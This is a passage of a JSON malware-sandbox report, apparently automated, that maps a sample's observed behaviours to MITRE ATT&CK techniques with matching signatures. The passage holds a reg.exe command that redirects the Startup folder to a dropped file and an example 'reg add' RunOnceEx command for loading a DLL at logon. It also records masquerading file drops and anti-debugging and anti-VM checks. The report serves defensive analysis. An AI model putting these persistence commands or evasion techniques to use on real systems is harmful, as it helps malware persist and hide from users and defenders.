Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "INFO", "description": "Stores large binary data to the registry", "match_data": ["HKEY_CURRENT_USER\\Console\\0 d33f351a4aeea5e608853d1a56661059", "C:\\Windows\\SysWOW64\\reg.exe \"C:\\Windows\\System32\\reg.exe\" add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /v \"Startup\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\Local\\{16023"]}, {"severity": "INFO", "description": "Uses reg.exe to modify the Windows registry", "match_data": ["HKEY_CURRENT_USER\\Console\\0 d33f351a4aeea5e608853d1a56661059", "C:\\Windows\\SysWOW64\\reg.exe \"C:\\Windows\\System32\\reg.exe\" add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /v \"Startup\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\Local\\{16023"]}]}]}, {"id": "TA0004", "name": "Privilege Escalation", "link": "https://attack.mitre.org/tactics/TA0004/", "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ", "techniques": [{"id": "T1547", "name": "Boot or Logon Autostart Execution", "link": "https://attack.mitre.org/techniques/T1547/", "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges."}, {"id": "T1547.001", "name": "Registry Run Keys / Startup Folder", "link": "https://attack.mitre.org/techniques/T1547/001/", "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "signatures": [{"severity": "LOW", "description": "Creates an undocumented autostart registry key", "match_data": ["HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders Startup"]}]}, {"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptbase.dll", "windows.storage.dll", "wintypes.dll", "kernel.appcore.dll", "uxtheme.dll", "iertutil.dll", "sspicli.dll", "profapi.dll", "ondemandconnroutehelper.dll", "mswsock.dll", "iphlpapi.dll", "winhttp.dll", "winnsi.dll", "urlmon.dll", "srvcli.dll", "netutils.dll", "propsys.dll", "cfgmgr32.dll", "linkinfo.dll", "ntshrui.dll", "cscapi.dll", "sxs.dll", "onecorecommonproxystub.dll", "onecoreuapcommonproxystub.dll", "windows.staterepositoryps.dll", "appresolver.dll", "userenv.dll", "bcp47langs.dll", "twext.dll", "twinapi.appcore.dll", "windows.fileexplorer.common.dll", "textshaping.dll", "policymanager.dll", "msvcp110_win.dll", "cryptsp.dll", "rsaenh.dll", "bcrypt.dll", "secur32.dll", "version.dll", "wtsapi32.dll", "starttiledata.dll", "acppage.dll", "sfc.dll", "sfc_os.dll", "servicingcommon.dll", "edputil.dll", "virtdisk.dll", "wldp.dll", "smartscreenps.dll", "shdocvw.dll", "msasn1.dll", "winmm.dll", "napinsp.dll", "pnrpnsp.dll", "dnsapi.dll", "winrnr.dll", "wshbth.dll", "nlansp_c.dll", "fwpuclnt.dll", "rasadhlp.dll", "dxgi.dll", "dinput8.dll", "inputhost.dll", "coremessaging.dll", "dxcore.dll", "resourcepolicyclient.dll", "directxdatabasehelper.dll", "devenum.dll", "ntmarta.dll", "devobj.dll", "msdmo.dll", "avicap32.dll", "msvfw32.dll", "windows.staterepositorycore.dll", "windowscodecs.dll", "msvcp140.dll", "vcruntime140_1.dll", "vcruntime140.dll", "uiautomationcore.dll", "msvcp140_1.dll", "d2d1.dll", "dwrite.dll", "d3dcompiler_47.dll", "d3d11.dll"]}]}, {"id": "T1055", "name": "Process Injection", "link": "https://attack.mitre.org/techniques/T1055/", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ", "signatures": [{"severity": "INFO", "description": "May try to detect the Windows Explorer process (often used for injection)", "match_data": ["inProgram Manager"]}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1574", "name": "Hijack Execution Flow", "link": "https://attack.mitre.org/techniques/T1574/", "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads."}, {"id": "T1574.002", "name": "DLL Side-Loading", "link": "https://attack.mitre.org/techniques/T1574/002/", "description": "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to DLL, side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.", "signatures": [{"severity": "INFO", "description": "Tries to load missing DLLs", "match_data": ["apphelp.dll", "wininet.dll", "cryptbase.dll", "windows.storage.dll", "wintypes.dll", "kernel.appcore.dll", "uxtheme.dll", "iertutil.dll", "sspicli.dll", "profapi.dll", "ondemandconnroutehelper.dll", "mswsock.dll", "iphlpapi.dll", "winhttp.dll", "winnsi.dll", "urlmon.dll", "srvcli.dll", "netutils.dll", "propsys.dll", "cfgmgr32.dll", "linkinfo.dll", "ntshrui.dll", "cscapi.dll", "sxs.dll", "onecorecommonproxystub.dll", "onecoreuapcommonproxystub.dll", "windows.staterepositoryps.dll", "appresolver.dll", "userenv.dll", "bcp47langs.dll", "twext.dll", "twinapi.appcore.dll", "windows.fileexplorer.common.dll", "textshaping.dll", "policymanager.dll", "msvcp110_win.dll", "cryptsp.dll", "rsaenh.dll", "bcrypt.dll", "secur32.dll", "version.dll", "wtsapi32.dll", "starttiledata.dll", "acppage.dll", "sfc.dll", "sfc_os.dll", "servicingcommon.dll", "edputil.dll", "virtdisk.dll", "wldp.dll", "smartscreenps.dll", "shdocvw.dll", "msasn1.dll", "winmm.dll", "napinsp.dll", "pnrpnsp.dll", "dnsapi.dll", "winrnr.dll", "wshbth.dll", "nlansp_c.dll", "fwpuclnt.dll", "rasadhlp.dll", "dxgi.dll", "dinput8.dll", "inputhost.dll", "coremessaging.dll", "dxcore.dll", "resourcepolicyclient.dll", "directxdatabasehelper.dll", "devenum.dll", "ntmarta.dll", "devobj.dll", "msdmo.dll", "avicap32.dll", "msvfw32.dll", "windows.staterepositorycore.dll", "windowscodecs.dll", "msvcp140.dll", "vcruntime140_1.dll", "vcruntime140.dll", "uiautomationcore.dll", "msvcp140_1.dll", "d2d1.dll", "dwrite.dll", "d3dcompiler_47.dll", "d3d11.dll"]}]}, {"id": "T1055", "name": "Process Injection", "link": "https://attack.mitre.org/techniques/T1055/", "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ", "signatures": [{"severity": "INFO", "description": "May try to detect the Windows Explorer process (often used for injection)", "match_data": ["inProgram Manager"]}]}, {"id": "T1036", "name": "Masquerading", "link": "https://attack.mitre.org/techniques/T1036/", "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\nRenaming abusable system utilities to evade security monitoring is also a form of Masquerading.", "signatures": [{"severity": "INFO", "description": "Creates files inside the system directory", "match_data": ["C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\Public\\Videos\\svchost.exe", "C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\user\\AppData\\Local\\{160233FB-271D-484e-942B-106A535D1482}"]}, {"severity": "LOW", "description": "Drops PE files with benign system names", "match_data": ["C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\Public\\Videos\\svchost.exe", "C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\user\\AppData\\Local\\{160233FB-271D-484e-942B-106A535D1482}"]}, {"severity": "INFO", "description": "Drops PE files to the windows directory (C:\\\\Windows)", "match_data": ["C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\Public\\Videos\\svchost.exe", "C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\user\\AppData\\Local\\{160233FB-271D-484e-942B-106A535D1482}"]}, {"severity": "INFO", "description": "Creates files inside the user directory", "match_data": ["C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\Public\\Videos\\svchost.exe", "C:\\Windows\\SysWOW64\\libcef.dll", "C:\\Users\\user\\AppData\\Local\\{160233FB-271D-484e-942B-106A535D1482}"]}]}, {"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "INFO", "description": "Stores large binary data to the registry", "match_data": ["HKEY_CURRENT_USER\\Console\\0 d33f351a4aeea5e608853d1a56661059", "C:\\Windows\\SysWOW64\\reg.exe \"C:\\Windows\\System32\\reg.exe\" add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /v \"Startup\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\Local\\{16023"]}, {"severity": "INFO", "description": "Uses reg.exe to modify the Windows registry", "match_data": ["HKEY_CURRENT_USER\\Console\\0 d33f351a4aeea5e608853d1a56661059", "C:\\Windows\\SysWOW64\\reg.exe \"C:\\Windows\\System32\\reg.exe\" add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" /v \"Startup\" /t REG_SZ /d \"C:\\Users\\user\\AppData\\Local\\{16023"]}]}, {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "INFO", "description": "Sleep loop found (likely to delay execution)", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "INFO", "description": "May sleep (evasive loops) to hinder dynamic analysis", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "LOW", "description": "Hides threads from debuggers", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "INFO", "description": "Checks if the current process is being debugged", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "INFO", "description": "Sleep loop found (likely to delay execution)", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "INFO", "description": "May sleep (evasive loops) to hinder dynamic analysis", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "LOW", "description": "Hides threads from debuggers", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "INFO", "description": "Checks if the current process is being debugged", "match_data": ["Count: 1762 delay: -10", "205 > 30", "1762 > 30", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}]}, {"id": "T1012", "name": "Query Registry", "link": "https://attack.mitre.org/techniques/T1012/", "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "signatures": [{"severity": "INFO", "description": "Monitors certain registry keys / values for changes (often done to protect autostart functionality)", "match_data": ["HKEY_CURRENT_USER_Classes"]}]}, {"id": "T1518", "name": "Software Discovery", "link": "https://attack.mitre.org/techniques/T1518/", "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as Software Deployment Tools, and may allow adversaries broad access to infect devices or move laterally.\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to Exploitation for Privilege Escalation."}, {"id": "T1518.001", "name": "Security Software Discovery", "link": "https://attack.mitre.org/techniques/T1518/001/", "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.", "signatures": [{"severity": "INFO", "description": "May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)", "match_data": ["Hyper-V RAWx", "AGE#Volume#{e87602ba-fe02-11ef-83b3-806e6f6e6963}#00000022D0900000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\?\\SCSI#CdRom&Ven_QEMU&Prod_QEMU_DVD-ROM#4&35424867&0&010000#{53f5630d-b6bf-11d0-94f2-00a0c91e", "Hyper-V RAWf", "Hyper-V RAW~;TO", "Hyper-V RAW%SystemRoot%\\system32\\mswsock.dll`3J", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "LOW", "description": "Tries to detect virtualization through RDTSC time measurements", "match_data": ["Hyper-V RAWx", "AGE#Volume#{e87602ba-fe02-11ef-83b3-806e6f6e6963}#00000022D0900000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\?\\SCSI#CdRom&Ven_QEMU&Prod_QEMU_DVD-ROM#4&35424867&0&010000#{53f5630d-b6bf-11d0-94f2-00a0c91e", "Hyper-V RAWf", "Hyper-V RAW~;TO", "Hyper-V RAW%SystemRoot%\\system32\\mswsock.dll`3J", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "LOW", "description": "Tries to evade analysis by execution special instruction (VM detection)", "match_data": ["Hyper-V RAWx", "AGE#Volume#{e87602ba-fe02-11ef-83b3-806e6f6e6963}#00000022D0900000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\?\\SCSI#CdRom&Ven_QEMU&Prod_QEMU_DVD-ROM#4&35424867&0&010000#{53f5630d-b6bf-11d0-94f2-00a0c91e", "Hyper-V RAWf", "Hyper-V RAW~;TO", "Hyper-V RAW%SystemRoot%\\system32\\mswsock.dll`3J", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "LOW", "description": "Hides threads from debuggers", "match_data": ["Hyper-V RAWx", "AGE#Volume#{e87602ba-fe02-11ef-83b3-806e6f6e6963}#00000022D0900000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\?\\SCSI#CdRom&Ven_QEMU&Prod_QEMU_DVD-ROM#4&35424867&0&010000#{53f5630d-b6bf-11d0-94f2-00a0c91e", "Hyper-V RAWf", "Hyper-V RAW~;TO", "Hyper-V RAW%SystemRoot%\\system32\\mswsock.dll`3J", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: DB727E instructions rdtsc caused by: RDTSC with Trap Flag (TF)", "HideFromDebugger", "DebugPort", "DebugObjectHandle"]}, {"severity": "INFO", "description": "Checks if the current process is being debugged", "match_data": ["Hyper-V RAWx", "AGE#Volume#{e87602ba-fe02-11ef-83b3-806e6f6e6963}#00000022D0900000#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}\\\\?\\SCSI#CdRom&Ven_QEMU&Prod_QEMU_DVD-ROM#4&35424867&0&010000#{53f5630d-b6bf-11d0-94f2-00a0c91e", "Hyper-V RAWf", "Hyper-V RAW~;TO", "Hyper-V RAW%SystemRoot%\\system32\\mswsock.dll`3J", "First address: DA3D36 second address: DA3D45 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 0x00000005 pop edi 0x00000006 bswap ebx 0x00000008 pop ebx 0x00000009 bswap bp 0x0000000c not ebp 0", "First address: A2FEF9 second address: A2FF02 instructions: 0x00000000 rdtsc 0x00000002 setns bl 0x00000005 shl edx, FFFFFFCAh 0x00000008 pop esi 0x00000009 rdtsc ", "First address: AA8AC5 second address: AA8AD4 instructions: 0x00000000 rdtsc 0x00000002 movzx ebp, bx 